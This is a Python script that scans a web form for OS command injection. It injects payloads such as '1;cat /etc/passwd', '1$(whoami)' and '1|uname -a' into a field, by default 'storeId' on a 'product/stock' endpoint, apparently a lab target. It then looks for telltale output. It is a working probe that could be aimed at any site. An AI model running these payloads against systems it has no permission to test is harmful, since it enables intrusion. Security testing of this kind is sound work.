import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

visible_payloads = [
    '1|whoami',
    '1|id',
    '1|uname -a',
    '1;whoami',
    '1;id',
    '1;uname -a',
    '1&&whoami',
    '1&&id',
    '1&&uname -a',
    '1`whoami`',
    '1$(whoami)',
    '1;cat /etc/passwd',
    '1|cat /etc/passwd',
    '1&&cat /etc/passwd',
    '1|ls',
    '1;ls',
    '1&&ls',
]

def find_form_action_and_params(url):
    """
    Finds the form action URL and input parameters from a given URL.
    
    Args:
        url (str): The URL to scan for forms.
    
    Returns:
        tuple: A tuple containing the form action URL and a dictionary of input parameters.
    """
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        action = form.get('action')
        inputs = form.find_all('input')
        params = {input_tag.get('name'): input_tag.get('value', '') for input_tag in inputs if input_tag.get('name')}
        if action and params:
            return action, params
    return None, None

def test_visible_injection(url, method, action, initial_params, payloads):
    """
    Tests for visible OS command injection vulnerabilities using various payloads.
    
    Args:
        url (str): The base URL of the website.
        method (str): The HTTP method to use ('GET' or 'POST').
        action (str): The form action URL.
        initial_params (dict): The initial parameters to include in the form.
        payloads (list): A list of payloads to test for OS command injection.
    
    Returns:
        str: A result message indicating whether a vulnerability was detected.
    """
    full_url = urljoin(url, action)
    for payload in payloads:
        params = initial_params.copy()
        # Assuming we need to inject in storeId, if another parameter is needed, adjust accordingly
        if 'storeId' in params:
            params['storeId'] = payload
        else:
            # If 'storeId' is not present, inject payload into the first parameter
            first_param = next(iter(params))
            params[first_param] = payload
        
        try:
            if method == 'POST':
                response = requests.post(full_url, data=params)
            else:
                response = requests.get(full_url, params=params)
                
            if response.status_code == 200:
                response_text = response.text.lower()
                if any(keyword in response_text for keyword in ['root', 'uid=', 'linux', 'bin/', 'daemon', 'sys']):
                    return f'Visible Injection Detected with payload: {payload}'
        except requests.RequestException as e:
            return f"Error occurred while testing {method} with payload: {payload}. Error: {e}"
    return 'No OS command injection vulnerabilities detected.'

def scan_os_command_injection(url):
    """
    Scans a given URL for OS command injection vulnerabilities.
    
    Args:
        url (str): The URL to scan.
    
    Returns:
        tuple: A tuple containing a boolean indicating if vulnerabilities were found and a result message.
    """
    action, initial_params = find_form_action_and_params(url)
    
    if action is None or initial_params is None:
        # Manually set the endpoint and parameters if form detection fails
        action = 'product/stock'
        initial_params = {'productId': '1', 'storeId': ''}
    
    # Test both POST and GET methods
    result = test_visible_injection(url, 'POST', action, initial_params, visible_payloads)
    if 'No OS' in result:
        result = test_visible_injection(url, 'GET', action, initial_params, visible_payloads)
    
    vulnerabilities_found = 'Visible Injection Detected' in result
    return vulnerabilities_found, result
